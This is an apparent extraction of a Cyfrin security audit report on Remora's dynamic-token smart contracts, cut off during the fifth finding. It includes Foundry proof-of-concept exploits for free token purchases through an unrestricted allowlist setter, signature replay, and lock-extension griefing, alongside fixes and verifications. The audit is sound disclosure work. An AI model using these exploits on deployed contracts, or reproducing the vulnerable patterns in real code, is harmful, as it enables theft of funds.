{
  "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1",
  "source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md",
  "source_mtime": "2025-11-01T12:05:00+00:00",
  "extracted_at": "2025-11-12T02:04:23.932064+00:00",
  "extractor_version": "poc-0.4-md-no-llm",
  "repositories": [
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [cc447da](https://github.com/remora-projects/remora-dynamic-tokens/commit/cc447da9fca1a997ffbb34f4d099be8f7dce7133)"
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "4f73c1de5e9b0beea6cdc0af3eb43bc4546ea203",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [4f73c1d](https://github.com/remora-projects/remora-dynamic-tokens/commit/4f73c1de5e9b0beea6cdc0af3eb43bc4546ea203)"
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "1a698942c15a8a0ab7b866bca2a6409bcb221828",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [1a69894](https://github.com/remora-projects/remora-dynamic-tokens/commit/1a698942c15a8a0ab7b866bca2a6409bcb221828)."
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "3d6d87430bbabb16afce37e5cbfe968093fc2d24",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [3d6d874](https://github.com/remora-projects/remora-dynamic-tokens/commit/3d6d87430bbabb16afce37e5cbfe968093fc2d24)."
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "de9a89a5eca6a5c9089bc07904662b8a64556dea",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [de9a89a](https://github.com/remora-projects/remora-dynamic-tokens/commit/de9a89a5eca6a5c9089bc07904662b8a64556dea)"
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "b612c8735b9da1e563af7b0071f3da0c67d60702",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [b612c87](https://github.com/remora-projects/remora-dynamic-tokens/commit/b612c8735b9da1e563af7b0071f3da0c67d60702)."
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "6365a9e970758605f973ce0319236805e4188986",
      "evidence": {
        "page": null,
        "snippet": "However, a mistake that could occur is that admin calls `PaymentSettler::enableBurning()` instead. All though this may not be expected, this succeeds because there are no checks against the `TokenData..."
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "45e974546e47d4e8248374b31f0cc01d07dcf04b",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [45e9745](https://github.com/remora-projects/remora-dynamic-tokens/commit/45e974546e47d4e8248374b31f0cc01d07dcf04b)"
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "c729f6eb61235efd02095cecff3b2b3a82956257",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [c729f6e](https://github.com/remora-projects/remora-dynamic-tokens/commit/c729f6eb61235efd02095cecff3b2b3a82956257)"
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "a69e89357e5180150894b8d8b24f273bdf45893c",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [a69e893](https://github.com/remora-projects/remora-dynamic-tokens/commit/a69e89357e5180150894b8d8b24f273bdf45893c)"
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "5ed432479dec26cb1bcb7484e765eb7319f76c0a",
      "evidence": {
        "page": null,
        "snippet": "Fixed at commit [5ed4324](https://github.com/remora-projects/remora-dynamic-tokens/commit/5ed432479dec26cb1bcb7484e765eb7319f76c0a)"
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "470ed749b6657d74746910129865964c053102ab",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [470ed74](https://github.com/remora-projects/remora-dynamic-tokens/commit/470ed749b6657d74746910129865964c053102ab)"
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "588b165ddf74a8ef94035f47bfaac878a35dbfa1",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [588b165](https://github.com/remora-projects/remora-dynamic-tokens/commit/588b165ddf74a8ef94035f47bfaac878a35dbfa1)."
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "6f53406266490f5ad66202fb82efef7d64980955",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [6f53406](https://github.com/remora-projects/remora-dynamic-tokens/commit/6f53406266490f5ad66202fb82efef7d64980955)"
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "a27fae35aef4f5d695401ee289c8a2dc19f2be31",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [a27fae3](https://github.com/remora-projects/remora-dynamic-tokens/commit/a27fae35aef4f5d695401ee289c8a2dc19f2be31)"
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "e12af9dd70476a143f444a793aff3538b136ca1a",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [e12af9d](https://github.com/remora-projects/remora-dynamic-tokens/commit/e12af9dd70476a143f444a793aff3538b136ca1a)."
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "511e7da2038e669f628c8232fd8f37c1e6798fab",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [511e7da](https://github.com/remora-projects/remora-dynamic-tokens/commit/511e7da2038e669f628c8232fd8f37c1e6798fab)."
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "2fc2c119b8cec8f46ccd9bacf5cb9ead1c040484",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [2fc2c11](https://github.com/remora-projects/remora-dynamic-tokens/commit/2fc2c119b8cec8f46ccd9bacf5cb9ead1c040484)."
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "a3ae70627dbeb55ac5f9bfeb6ab4a4512703c6c8",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [a3ae706](https://github.com/remora-projects/remora-dynamic-tokens/commit/a3ae70627dbeb55ac5f9bfeb6ab4a4512703c6c8)"
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "846851ae7f691ed77d235185584ac0fb82b43e77",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [846851a](https://github.com/remora-projects/remora-dynamic-tokens/commit/846851ae7f691ed77d235185584ac0fb82b43e77)."
      }
    },
    {
      "url": "https://github.com/remora-projects/remora-dynamic-tokens",
      "org": "remora-projects",
      "repo": "remora-dynamic-tokens",
      "commit": "f753faca15ce9bfdcda3ed690c65aba410a22f37",
      "evidence": {
        "page": null,
        "snippet": "**Remora:** Fixed at commit [f753fac](https://github.com/remora-projects/remora-dynamic-tokens/commit/f753faca15ce9bfdcda3ed690c65aba410a22f37)."
      }
    }
  ],
  "report_schema": [
    {
      "key": "Severity",
      "meaning": "How serious the impact of this finding is.",
      "expected_values": "Informational / Low / Medium / High"
    },
    {
      "key": "Difficulty",
      "meaning": "How hard it is to exploit this vulnerability.",
      "expected_values": "Low / Medium / High"
    },
    {
      "key": "Type",
      "meaning": "The category or nature of the vulnerability.",
      "expected_values": "String describing the type of vulnerability (e.g., Data Validation, Reentrancy)"
    },
    {
      "key": "Finding ID",
      "meaning": "A unique identifier for the specific finding.",
      "expected_values": "String with a consistent format (e.g., TOB-ELA-1)"
    },
    {
      "key": "Target",
      "meaning": "The location of the vulnerability in the codebase.",
      "expected_values": "Path to affected file / contract"
    }
  ],
  "vulnerability_sections": [
    {
      "index": 1,
      "page_start": null,
      "heading": "`SignatureValidator::setAllowlist` is unrestricted leading to free purchases of tokens",
      "markdown": "### `SignatureValidator::setAllowlist` is unrestricted leading to free purchases of tokens\n\n**Description:** `SignatureValidator::setAllowlist` is unrestricted.\n\nSince `SignatureValidator` inherited by `ReferralManager` and `TokenBank` this has downstream consequences.\n\nFor `TokenBank` in particular this means that\n- attacker can call `TokenBank::setAllowlist(maliciousAllowList)` where `maliciousAllowList::isSigner`  just returns `true` for the attacker\n- They can then spoof a signature by a Remora admin\n- call `TokenBank::buyTokenOCP` using the spoofed signature\n- `buyTokenOCP` indirectly calls `_buyToken` with `useStableCoin == false`\n- thus the entire code path guarded by `if (useStablecoin) {` is skipped and no stablecoins are transferred from the attacker\n\nThe same vulnerability could be used to steal all of `ReferralManager`'s bonuses.\n\n**Impact:** Attacker can\n- purchase all remaining central tokens for free\n- steal from `ReferralManager` bonuses\n\n**Proof of Concept:** The PoC below  demonstrates the buying of central tokens for free.\n\nAdd `MaliciousAllowlist.sol`\n```solidity\ncontract MaliciousAllowlist {\n\n    address maliciousSigner;\n\n    constructor(address _maliciousSigner) {\n        maliciousSigner = _maliciousSigner;\n    }\n\n    function isSigner(address signer) public view returns (bool) {\n        return (signer == maliciousSigner);\n    }\n\n}\n```\n\nAnd then add this test to `TokenBankTest.t.sol` (after adding import of `MaliciousSigner`)\n\n```solidity\n    function test_cyfrin_buyTokenOCP_for_free() public {\n        uint64 TOTAL_TOKENS = 10_000;\n        _addCentralToTokenBank(60e6, true, 50_000);\n\n        centralTokenProxy.mint(address(tokenBankProxy), uint64(TOTAL_TOKENS));\n        address attacker = getDomesticUser(2);\n\n        (address attackerSigner, uint256 sk) = makeAddrAndKey(\"BUY_SIGNER\");\n\n\n        /*\n         * Attacker sets a malicious Allowlist and signs the buy instead of a Remora Admin\n         */\n        vm.startPrank(attackerSigner);\n        MaliciousAllowlist maliciousAllowlist = new MaliciousAllowlist(attackerSigner);\n        tokenBankProxy.setAllowlist(address(maliciousAllowlist));\n        bytes32 typeHash = keccak256(\"BuyToken(address investor, address token, uint256 amount)\");\n        bytes32 structHash = keccak256(abi.encode(typeHash, attacker, address(centralTokenProxy), uint256(TOTAL_TOKENS)));\n        bytes32 digest = MessageHashUtils.toTypedDataHash(tokenBankProxy.getDomainSeparator(), structHash);\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(sk, digest);\n        bytes memory sig = abi.encodePacked(r, s, v);\n        vm.stopPrank();\n\n        /*\n         * Now attacker buys all the tokens using the signature they created\n         */\n        vm.prank(attacker);\n        tokenBankProxy.buyTokenOCP(attackerSigner, address(centralTokenProxy), TOTAL_TOKENS, sig);\n        // attacker receives domestic child tokens\n        assertEq(d_childTokenProxy.balanceOf(attacker), TOTAL_TOKENS);\n    }\n```\n\n**Recommended Mitigation:** Since `SignatureValidator` is an abstract contract, `setAllowlist` should be an internal function.\n\n```diff\n-    function setAllowlist(address allowlist) external {\n+    function _setAllowlist(address allowlist) internal {\n        if (allowlist == address(0)) revert InvalidAddress();\n        SVStorage storage $ = _getSVStorageStorage();\n        if ($._allowlist != allowlist) {\n            $._allowlist = allowlist;\n            emit AllowlistSet(allowlist);\n        }\n    }\n```\n\n`TokenBank` should then expose `setAllowlist` as an external function with the `restricted` modifier\n\n```diff\n+   function setAllowlist(address signer) external restricted {\n+       super._setAllowlist(signer);\n+   }\n```\n\n**Remora:** Fixed at commit [cc447da](https://github.com/remora-projects/remora-dynamic-tokens/commit/cc447da9fca1a997ffbb34f4d099be8f7dce7133)\n\n**Cyfrin:** Verified. `setAllowlist()` is now restricted.\n",
      "finding_id": null,
      "severity": "Critical",
      "start_line": 16,
      "end_line": 117,
      "description": null,
      "metadata": {
        "Severity": "Critical",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "`SignatureValidator::setAllowlist` is unrestricted leading to free purchases of tokens"
    },
    {
      "index": 2,
      "page_start": null,
      "heading": "Signatures on `TokenBank` and `AllowList` can be reused in perpetuity an infinite amount of times",
      "markdown": "### Signatures on `TokenBank` and `AllowList` can be reused in perpetuity an infinite amount of times\n\n**Description:** `TokenBank` allows buyers to purchase tokens by getting an off-chain signature, which specifies the token and the amount they are allowed to buy. When buying using a signature, the buyer doesn't have to pay on-chain for the purchase (As that is handled off-chain). The problem is that the `hash` of the signature doesn't include a `nonce` to prevent the same signature from being reused to process multiple purchases.\n- The `hash` only includes the `investor`, `token`, and `amount`, which leads to the contract not being able to determine if a signature has already been used or not.\n```solidity\n//TokenBank.sol//\n    // Handle payment off chain, including referral discount\n    function buyTokenOCP(\n        address signer,\n        address tokenAddress,\n        uint256 amount,\n        bytes memory signature\n    ) external nonReentrant {\n        ...\n        if (!verifySignature(signer, sender, tokenAddress, amount, signature))\n            revert InvalidSignature();\n        //@audit => No payment of stablecoin!\n        _buyToken(address(0), sender, tokenAddress, amount, false);\n    }\n\n    function verifySignature(\n        address signer,\n        address investor,\n        address token,\n        uint256 amount,\n        bytes memory signature\n    ) internal view returns (bool result) {\n//@audit-issue => No nonce on the hash of the signature\n@>      bytes32 structHash = keccak256(\n            abi.encode(\n                BUY_TOKEN_TYPEHASH,\n                investor,\n                token,\n                amount\n        ));\n\n        result = _verifySignature(signer, _hashTypedDataV4(structHash), signature);\n    }\n\n```\n\nThis same problem is present in the `AllowList` contract, which allows users to reuse signatures to regain their permissions if they are removed.\n\n**Impact:** On `TokenBank`:\n- Buyers can reuse signatures to purchase infinite tokens by paying the cost to obtain a single signature\n\nOn `AllowList`:\n- user replays selfAllowUser signature to add themselves to the allow list again.\n- A malicious admin who was removed as an admin can replay a signature after he was removed to re-enable themselves.\n\n**Proof of Concept:** Add the next PoC to `TokenBankTest.t.sol`:\n```solidity\n    function test_cyfrin_buyTokenOCP_offchain_ReUseSignature() public {\n        uint256 TOKENS_TO_PURCHASE = 1;\n        _addCentralToTokenBank(60e6, true, 50_000);\n        // seed inventory\n        centralTokenProxy.mint(address(tokenBankProxy), uint64(5));\n        address to = getDomesticUser(2);\n        // register authorized signer in allowlist\n        (address signer, uint256 sk) = makeAddrAndKey(\"BUY_SIGNER\");\n        bytes4[] memory asel = new bytes4[](1);\n        asel[0] = bytes4(keccak256(\"addAuthorizedSigner(address)\"));\n        accessMgrProxy.setTargetFunctionRole(address(allowListProxy), asel, ADMIN_TOKEN_ID);\n        accessMgrProxy.grantRole(ADMIN_TOKEN_ID, address(this), 0);\n        allowListProxy.addAuthorizedSigner(signer);\n        // build EIP-712 signature for BuyToken(investor, token, amount)\n        bytes32 typeHash = keccak256(\"BuyToken(address investor, address token, uint256 amount)\");\n        bytes32 structHash = keccak256(abi.encode(typeHash, to, address(centralTokenProxy), TOKENS_TO_PURCHASE));\n        bytes32 digest = MessageHashUtils.toTypedDataHash(tokenBankProxy.getDomainSeparator(), structHash);\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(sk, digest);\n        bytes memory sig = abi.encodePacked(r, s, v);\n        vm.startPrank(to);\n        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);\n        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);\n        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);\n        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);\n        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);\n        // to receives domestic child tokens\n        assertEq(d_childTokenProxy.balanceOf(to), 5);\n        vm.stopPrank();\n    }\n\n```\n\n**Recommended Mitigation:** Consider adding a `nonce` to the hash that is signed. Refer to these articles to get more familiar with signature replay attacks\n- [Mitigate Against Nonce Replay Attacks](https://www.remora-projects.io/blog/replay-attack-in-ethereum#mitigating-against-missing-nonce-replay-attacks)\n- [Signature Replay Attacks](https://dacian.me/signature-replay-attacks#heading-missing-nonce-replay)\n\n**Remora:** Fixed at commit [4f73c1d](https://github.com/remora-projects/remora-dynamic-tokens/commit/4f73c1de5e9b0beea6cdc0af3eb43bc4546ea203)\n\n**Cyfrin:** Verified. A nonce has been added to the digestHash that is used to validate the signature.\n\n\\clearpage\n",
      "finding_id": null,
      "severity": "Critical",
      "start_line": 117,
      "end_line": 210,
      "description": null,
      "metadata": {
        "Severity": "Critical",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Signatures on `TokenBank` and `AllowList` can be reused in perpetuity an infinite amount of times"
    },
    {
      "index": 3,
      "page_start": null,
      "heading": "Pending payouts when resolving an investor are lost because there is no mechanism to claim the resolved payment",
      "markdown": "### Pending payouts when resolving an investor are lost because there is no mechanism to claim the resolved payment\n\n**Description:** When resolving a user who loses access to their account, the `ChildToken::resolveUser` function migrates balances, locks, and frozen tokens to a new address, ensuring the investor retains their previous balances. Even the pending payouts are calculated and assigned to the new address with the intention of allowing the investor to claim those pending payouts from the new account.\n\nThe problem is that no function allows an account to claim the calculated `resolvedPay`, which means the pending payouts for the old addresses are indeed migrated to the new addresses; however, the contracts don't offer a mechanism for investors to claim such payouts.\n```solidity\n///DividendManager.sol//\n    function _resolvePay(address oldAddress, address newAddress) internal {\n//@audit-issue => no function allows the `newAddress` to claim the payout of the `oldAddress` saved on the `_resolvedPay` mapping associated to the `newAddress`\n@>      _getHolderManagementStorage()._resolvedPay[newAddress] = SafeCast.toUint128(_claimPayout(oldAddress));\n        emit PaymentResolved(oldAddress, newAddress);\n    }\n```\n\nAdditionally, it is theoretically possible that payouts for an old address are lost if the newAddress is an address with an existing `resolvedPay` balance. The `DividendManager::_resolvePay` function assigns the calculated payout of the old address, regardless of whether the `resolvedPay` mapping has any value in it.\n\n**Impact:** Pending payments for investors who lost access to their accounts and had their balances transferred to a new account via the `ChildToken::resolveUser` are lost.\n\n**Recommended Mitigation:** Consider implementing a function that allows the new addresses to claim the calculated `resolvedPay` of the old addresses.\n\n**Remora:** Fixed at commit [1a69894](https://github.com/remora-projects/remora-dynamic-tokens/commit/1a698942c15a8a0ab7b866bca2a6409bcb221828).\n\n**Cyfrin:** Verified. Payouts of resolved users are claimable by the `newAddress` via the `ChildToken::claimPayout`\n",
      "finding_id": null,
      "severity": "High",
      "start_line": 213,
      "end_line": 238,
      "description": null,
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Pending payouts when resolving an investor are lost because there is no mechanism to claim the resolved payment"
    },
    {
      "index": 4,
      "page_start": null,
      "heading": "Migrating the existing locks for an investor when is resolved can be gamed causing the existing locks to last longer than they should",
      "markdown": "### Migrating the existing locks for an investor when is resolved can be gamed causing the existing locks to last longer than they should\n\n**Description:** When resolving an investor, the existing locks on the `oldAddress` are migrated to the `newAddress` by appending the locks from the `oldAddress` right at the end of the existing locks on the `newAddress`.\n```solidity\n    function _newAccountSameLocks(address oldAddress, address newAddress) internal {\n        ...\n//@audit => locks from `oldAddress` are appended after the existing locks of the `newAddress`\n        uint16 len = oldData.endInd - oldData.startInd;\n        for (uint16 i = 0; i < len; ++i) {\n@>          newData.tokenLockUp[newData.endInd++] = oldData.tokenLockUp[\n                oldData.startInd + i\n            ];\n        }\n        newData.tokensLocked += oldData.tokensLocked;\n\n        // reset old user data\n        delete $._userData[oldAddress];\n    }\n```\n\nThe algorithm to unlock tokens as the locks surpass the `lockUpTime` and the algorithm to calculate the available tokens both stop iterating over the user's `tokenLockUps` as soon as a lock-up that has not expired is found.\n```solidity\n//LockUpManager.sol//\n\n    function _unlockTokens(\n        address holder,\n        uint256 amount,\n        bool disregardTime // used by admin actions\n    ) internal returns (uint32 amountUnlocked) {\n        ...\n        for (uint16 i = userData.startInd; i < len; ++i) {\n            // if not disregarding time, then check if the lock up time\n            // has been served; if not break out of loop\n//@audit-info => loop exits as soon as a lock that has not reached the lockUpTime is found\n            if (\n                !disregardTime &&\n@>              curTime - userData.tokenLockUp[i].time < lockUpTime\n            ) break;\n\n            // if here means this lockup has been served & can be unlocked\n            uint32 curEntryAmount = userData.tokenLockUp[i].amount;\n\n            ...\n        }\n\nfunction availableTokens(\n    address holder\n) public view returns (uint256 tokens) {\n    ...\n    for (uint16 i = userData.startInd; i < len; ++i) {\n        LockupEntry memory curEntry = userData.tokenLockUp[i];\n        if (curTime - curEntry.time >= lockUpTime) {\n            tokens += curEntry.amount;\n//@audit-info => loop exits as soon as a lock that has not reached the lockUpTime is found\n        } else {\n@>          break;\n        }\n    }\n}\n        ...\n    }\n\n```\n\nThe combination of how the tokens are migrated when resolving an investor and the algorithm's short-circuit as soon as a lock-up that has not expired is found, allows for a griefing attack where the tx to resolve an investor is frontran and 1 ChildToken is donated to the `newAddress`, the `ChildToken::resolveUser` function will migrate tokens to.\n- The donation will create a lock on the `newAddress` for the entire `lockUpDuration`. This lock will be the first lock of the `newAddress`, which means all the existing tokens from the `oldAddress` will be appended **after** that new lock. In other words, all existing locks at the `oldAddress` will remain locked until the new lock reaches the `lockUpDuration`, regardless of whether the `lockUpDuration` for those locks has already been met.\n\n\n**Impact:** Existing lock durations can be gamed, forcing the locks on the newAddress to last longer than they should\n\n**Proof of Concept:** Add the next PoC to `ChildTokenAdminTest.t.sol` test file.\nThe PoC demonstrates:\n1. Resolving users should preserve the existing locks on the `oldUser` (When the attack is not performed)\n2. The migrated tokens on the `newUser` get locked for a longer duration if the attack is performed.\n```solidity\n    function test_GrieffAttacToExtendLocksWhenResolving() public {\n        uint32 DEFAULT_LOCK_TIME = 365 days;\n        uint32 QUART_LOCKTIME = DEFAULT_LOCK_TIME / 4;\n\n        address oldUser = getDomesticUser(1);\n        address newUser = getDomesticUser(2);\n        address extraInvestor = getDomesticUser(3);\n\n        centralTokenProxy.mint(address(this), uint64(2));\n        centralTokenProxy.dynamicTransfer(extraInvestor, 2);\n\n        vm.warp(DEFAULT_LOCK_TIME);\n\n        centralTokenProxy.mint(address(this), uint64(4));\n        centralTokenProxy.dynamicTransfer(oldUser, 1);\n\n        // Distribute payout!\n        IERC20(address(stableCoin)).approve(address(paySettlerProxy), type(uint256).max);\n        paySettlerProxy.distributePayment(address(centralTokenProxy), address(this), 300); // 300 USD(6) total\n\n        vm.warp(block.timestamp + QUART_LOCKTIME);\n        centralTokenProxy.mint(address(this), uint64(1));\n        centralTokenProxy.dynamicTransfer(oldUser, 1);\n\n        vm.warp(block.timestamp + QUART_LOCKTIME);\n        centralTokenProxy.mint(address(this), uint64(1));\n        centralTokenProxy.dynamicTransfer(oldUser, 1);\n\n        vm.warp(block.timestamp + QUART_LOCKTIME);\n        centralTokenProxy.mint(address(this), uint64(1));\n        centralTokenProxy.dynamicTransfer(oldUser, 1);\n\n        uint256 snapshot1 = vm.snapshot();\n            //@audit-info => Validate each 3 months a new token would've been unlocked!\n            for(uint8 i = 1; i == 4; i++) {\n                vm.warp(block.timestamp + (QUART_LOCKTIME * i));\n                assertEq(d_childTokenProxy.availableTokens(oldUser),i);\n            }\n        vm.revertTo(snapshot1);\n\n\n        //@audit-info => Resolving the oldUser without the grieffing attack being executed!\n        d_childTokenProxy.resolveUser(oldUser, newUser);\n\n        //@audit-info => Validate each 3 months a new token would've been unlocked, even after the resolve, locks remains as they are\n        for(uint8 i = 1; i == 4; i++) {\n            vm.warp(block.timestamp + (QUART_LOCKTIME * i));\n            assertEq(d_childTokenProxy.availableTokens(oldUser),i);\n        }\n\n\n        vm.revertTo(snapshot1);\n\n        assertEq(d_childTokenProxy.availableTokens(oldUser),0);\n\n        //@audit => Frontruns resolveUser\n        vm.prank(extraInvestor);\n        d_childTokenProxy.transfer(newUser, 1);\n\n        d_childTokenProxy.resolveUser(oldUser, newUser);\n\n        //@audit-issue => Because of the donation prior to resolveUser() was executed, the locks for the migrated tokens are messed up and all the tokens are extended until the lock of the donated token is over!\n        //@audit-issue => Migrated tokens from oldUser are locked for an entire year\n        vm.warp(block.timestamp + QUART_LOCKTIME);\n        assertEq(d_childTokenProxy.availableTokens(newUser),0);\n\n        vm.warp(block.timestamp + QUART_LOCKTIME);\n        assertEq(d_childTokenProxy.availableTokens(newUser),0);\n\n        vm.warp(block.timestamp + QUART_LOCKTIME);\n        assertEq(d_childTokenProxy.availableTokens(newUser),0);\n\n        //@audit-issue => Only until the donated tokens is unlocked, so are all the migrated tokens\n        vm.warp(block.timestamp + QUART_LOCKTIME);\n        assertEq(d_childTokenProxy.availableTokens(newUser), 5);\n    }\n```\n\n**Recommended Mitigation:** Consider refactoring the logic to migrate the locks from the `oldAddress` to the `newAddress`, so that they are not simply appended to the end of the existing locks. Instead, iterate over the existing locks and compare the `tokenLockup.time` to reorder them so that the times of all the locks are correctly ordered sequentially based on the time. This will allow the existing locks on the `oldAddress` to correctly release the tokens on the `newAddress` as soon as they expire.\n\n**Remora:** Fixed at commit [3d6d874](https://github.com/remora-projects/remora-dynamic-tokens/commit/3d6d87430bbabb16afce37e5cbfe968093fc2d24).\n\n**Cyfrin:** Verified. Refactored `ChildToken::resolveUser` to transfer the signatures from the `oldAddress` to the `newAddress` instead of requiring the `newAddress` to have signed all the documents before resolving the `oldAddress`. This change prevents the `newAddress` from receiving any `ChildToken`, therefore, there won't be any existing locks on the `newAddress`.\n",
      "finding_id": null,
      "severity": "High",
      "start_line": 238,
      "end_line": 398,
      "description": null,
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Migrating the existing locks for an investor when is resolved can be gamed causing the existing locks to last longer than they should"
    },
    {
      "index": 5,
      "page_start": null,
      "heading": "Divide before multiply loses precision in `FiveFiftyRule::_updateEntityAllowance` and leads to caps being exceeded",
      "markdown": "### Divide before multiply loses precision in `FiveFiftyRule::_updateEntityAllowance` and leads to caps being exceeded\n\n**Description:** The function `_updateEntityAllowance` contains\n```solidity\n(REMORA_PERCENT_DENOMINATOR / aData.equity) * amount\n```\n\nThis should be `REMOTE_PERCENT_DENOMINATOR * amount / aData.equity` otherwise precision loss occurs.\n\nSince `_updateEntityAllowance` is used to calculate the amount by which the allowance should be reduced by when `add == false` this issue actually results in a remaining allowance that is too high.\n\n**Impact:** When `add == true` the new allowance will be significantly lower than it should be, which will just be frustrating to investors.\nWhen `add == false` the new allowance can be significantly higher than it should be, which means that investors that individually buy tokens _and_ are part of an entity can exceed their cap.\n\n**Proof of Concept:**\n1. First fix the bug in `canTransfer` because it obscures this bug\n\n```diff\n@@ -505,16 +505,16 @@ contract FiveFiftyRule is UUPSUpgradeable, AccessManagedUpgradeable {\n         // to side changes\n         if (to != address(0)) {\n             IndividualData storage iTo = individualData[to];\n-\n+\n             if (iTo.isEntity) { // if entity\n-                if (entityData[to].allowance <= amount) {\n-                    entityData[to].allowance -= SafeCast.toUint64(amount);\n+                if (entityData[to].allowance >= amount) {\n+                    entityData[to].allowance -= SafeCast.toUint64(amount);\n\n                     iTo.lastBalance += SafeCast.toUint64(amount);\n                     emit FiveFiftyApproved(from, to, amount);\n                     return true;\n                 } else revert ();\n```\n\n2. Now add the file below and run the test. In the console output you will see:\n\n```\n*** INVARIANT VIOLATED ***\n  exposure:   1200001000000\n  cap amount: 1000000000000\n```\n\nThe file's source code is:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.30;\n\nimport \"forge-std/console2.sol\";\nimport {RemoraTestBase} from \"../RemoraTestBase.sol\";\nimport {FiveFiftyRule} from \"../../../contracts/Compliance/FiveFiftyRule.sol\";\nimport {ERC1967Proxy} from \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport {SafeCast} from \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\n\n\ncontract FiveFiftyRule_RoundingPoC is RemoraTestBase {\n    FiveFiftyRule internal fiveFiftyRule;\n\n    // helpers (same as your math discussion)\n    uint256 constant DENOM = 1_000_000;\n\n    function setUp() public override {\n        RemoraTestBase.setUp();\n\n        // Deploy rule and initialize\n        fiveFiftyRule = FiveFiftyRule(address(new ERC1967Proxy(address(new FiveFiftyRule()), \"\")));\n        fiveFiftyRule.initialize(address(accessMgrProxy), 0);\n\n        // Allow our test to call restricted functions on fiveFiftyRule and child\n        